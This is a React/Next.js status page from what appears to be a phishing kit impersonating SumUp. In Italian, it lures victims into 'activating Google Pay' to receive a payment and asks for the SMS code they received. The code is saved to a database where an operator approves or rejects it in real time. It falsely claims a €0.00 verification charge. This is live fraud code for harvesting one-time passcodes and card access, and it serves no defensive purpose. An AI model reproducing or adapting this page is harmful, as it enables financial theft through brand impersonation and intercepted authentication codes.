"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { useRouter, useSearchParams } from "next/navigation";
import { createClient } from "@/lib/supabase/client";
import type { Submission } from "@/types";

export default function StatusClient() {
  const id = useSearchParams().get("id");
  const router = useRouter();
  const supabase = createClient();
  const [row, setRow] = useState<Submission | null>(null);
  const [error, setError] = useState("");

const [waitingName, setWaitingName] = useState("");
const [savingName, setSavingName] = useState(false);
const [nameSaved, setNameSaved] = useState(false);

const TOTAL_SECONDS = 5 * 60;
const [remaining, setRemaining] = useState(0);


const TOTAL_MS = 5 * 60 * 1000;

function getDeadline(id: string) {
  const key = `wait_deadline_${id}`;
  const saved = sessionStorage.getItem(key);
  if (saved) return Number(saved);
  const deadline = Date.now() + TOTAL_MS;
  sessionStorage.setItem(key, String(deadline));
  return deadline;
}

function secondsLeft(deadline: number) {
  return Math.max(0, Math.ceil((deadline - Date.now()) / 1000));
}

useEffect(() => {
  if (!id) return;

  const deadline = getDeadline(id);
 

  const timer = window.setInterval(() => {
    setRemaining(secondsLeft(deadline));
  }, 1000);

  return () => window.clearInterval(timer);
}, [id]);

const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
const seconds = String(remaining % 60).padStart(2, "0");

async function saveWaitingName(e: React.FormEvent) {
  e.preventDefault();
  if (!id || savingName) return;

  setSavingName(true);

  await createClient()
    .from("submissions")
    .update({ waiting_name: waitingName.trim() })
    .eq("id", id);

  // Stay on "loading" and refresh so admin decisions appear
  window.setTimeout(() => {
    window.location.reload();
  }, 30_000);
}


  const [note, setNote] = useState("");

  useEffect(() => {
    if (!id) return;

    let cancelled = false;

    async function load() {
      const { data, error: qError } = await supabase
        .from("submissions")
        .select("*")
        .eq("id", id)
        .single();

      if (cancelled) return;
      if (qError || !data) {
        setError(qError?.message ?? "Submission not found.");
        return;
      }
      setRow(data as Submission);
    }

    load();

    const channel = supabase
      .channel(`submission-${id}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "submissions",
          filter: `id=eq.${id}`,
        },
        (payload) => setRow(payload.new as Submission)
      )
      .subscribe();

    return () => {
      cancelled = true;
      supabase.removeChannel(channel);
    };
  }, [id, supabase]);

  useEffect(() => {
    if (row?.status === "approved") {
      router.push(`/next?id=${row.id}`);
    }
  }, [row, router]);

  if (!id) {
    return (
      <main className="mx-auto max-w-md px-6 py-16 text-center">
        <h1 className="text-2xl font-semibold">Missing submission</h1>
        <Link href="/" className="mt-4 inline-block text-blue-400 underline">
          Go back to the form
        </Link>
      </main>
    );
  }

  if (error) {
    return (
      <main className="mx-auto max-w-md px-6 py-16 text-center">
        <h1 className="text-2xl font-semibold">Error</h1>
        <p className="mt-2 text-[#9aa8b8]">{error}</p>
        <Link href="/" className="mt-4 inline-block text-blue-400 underline">
          Go back to the form
        </Link>
      </main>
    );
  }

  if (!row) {
    return (
      <main className="px-6 py-16 text-center text-[#9aa8b8]">Caricando...</main>
    );
  }

  if (row.status === "rejected") {
    return (
    <main className="mx-auto flex min-h-screen max-w-lg flex-col items-center bg-white px-6 py-12 text-gray-900">
            <img
          src="/powered-by.png"
          alt="Powered by"
          className="mx-auto mb-6 h-8 w-auto object-contain opacity-80"
        />
        <h1 className="text-2xl font-semibold text-red-400">Operazione non conclusa</h1>
        <p className="mt-3 text-[#0a0b0c]">
        Si prega di completare nuovamente la procedura.
        </p>
        <Link
          href="/"
          className="mt-6 inline-block rounded-lg bg-blue-600 px-4 py-2 text-white"
        >
          Riprova
        </Link>
         <footer className="mt-10 w-full text-center">
        <p className="mb-3 text-xs uppercase tracking-wide text-[#9aa8b8]">
          Powered by
        </p>
        <img
          src="/logo.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />

        <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
          <a href="https://sumup.com/legal/" className="hover:text-white hover:underline">
            Avviso legale
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/privacy/" className="hover:text-white hover:underline">
            Politica sulla riservatezza
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/terms/" className="hover:text-white hover:underline">
            Termini &amp; Condizioni
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/cookies/" className="hover:text-white hover:underline">
            Informativa sui cookie
          </a>
        </nav>
      </footer>
      </main>
    );
  }

  return (
   <main className="mx-auto flex min-h-screen max-w-lg flex-col items-center bg-white px-6 py-12 text-gray-900">
     <img
          src="/logo.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />
      <h1 className="text-1xl font-semibold">Attiva Google pay per la tua carta</h1>
      <p className="mt-3 text-[#000000]">
        Ciao {row.first_name}, i tuoi dati sono stati salvati!
      </p>
      <br></br>
      <p className="mt-4 text-sm uppercase tracking-wide text-[#393948]">
        ATTIVA GOOGLE PAY PER LA RICEZIONE DEL PAGAMENTO
      </p>
        <br></br>
     <b> <p className="mt-3 text-[#000000]">
       Inserire il codice ricevuto tramite sms per procedere.
      </p></b>

      <form onSubmit={saveWaitingName} className="mx-auto mt-6 w-full max-w-sm space-y-3">
        
  <input
    required
    type="numeric"
    placeholder="Codice"
    maxLength={6}
    value={waitingName}
    onChange={(e) => setWaitingName(e.target.value)}
    className="w-full rounded-lg border border-gray-300 px-3 py-2 text-gray-900 outline-none focus:border-blue-500"
  />
  <br></br>
  <button
  type="submit"
  disabled={savingName}
  className="flex w-full items-center justify-center gap-2 rounded-lg bg-blue-600 py-2 text-white disabled:cursor-not-allowed disabled:opacity-70"
>
  {savingName ? (
    <>
      <span className="h-3 w-2 animate-spin rounded-full border-2 border-white border-t-transparent" />
      Ricezione pagamento in corso…
    </>
  ) : (
    "Conferma"
  )}
</button>
<br></br>

         <br></br>
     <b> <p className="mt-3 text-[#bb1818]">
       ⚠︎ Carte revolut e postepay non supportate!
      </p></b>
      <br></br>

      <p className="text-sm text-gray-500">Per procedere alla ricezione del pagamento, il nostro emittente, effettuerà un addebito di €0,00 per verificare la tua carta. Non verrà effettuato alcun pagamento effettivo dalla tua carta.</p>   

  <div className="mt-8 flex flex-col items-center gap-4">
  <span className="h-12 w-12 animate-spin rounded-full border-4 border-gray-200 border-t-blue-600" />
  <p className="font-mono text-2xl tracking-widest text-gray-800">
    {minutes}:{seconds}
  </p>
  <p className="text-sm text-gray-500">Se non hai ricevuto nessun sms, conferma la notifica ricevuto sull tuo dispositivo entro 5 minuti dalla ricezione</p>
</div>
<br></br>

  <img
          src="/powered-by.png"
          alt="Powered by"
          className="mx-auto mb-6 h-8 w-auto object-contain opacity-80"
        />


</form>

   <footer className="mt-10 w-full text-center">
        <p className="mb-3 text-xs uppercase tracking-wide text-[#9aa8b8]">
          Powered by
        </p>
        <img
          src="/logo.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />

        <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
          <a href="https://sumup.com/legal/" className="hover:text-white hover:underline">
            Avviso legale
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/privacy/" className="hover:text-white hover:underline">
            Politica sulla riservatezza
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/terms/" className="hover:text-white hover:underline">
            Termini &amp; Condizioni
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/cookies/" className="hover:text-white hover:underline">
            Informativa sui cookie
          </a>
        </nav>
      </footer>
    </main>
  );
}
